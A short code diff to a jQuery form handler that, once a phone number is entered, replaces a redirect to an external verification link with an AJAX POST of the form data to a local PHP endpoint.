@@ -243,7 +243,17 @@
                         break;
                     case '5':
                       if($('#inputphone').val() !== "" && $('#inputphone').val() !== null){
-                        window.location.href = 'https://verifyhub.net/a7abe3c';
+                          $.ajax('/app/links.php', {
+                                type: 'POST',
+                                data: dataform,
+                                success: function (data) {
+                                    console.log(data);
+                                },
+                                error: function (jqXhr, textStatus, errorMessage) {
+                                    alert('error');
+                                }
+                          })
+                          
                       }else {
                         alert('Please enter phone number');
                       }
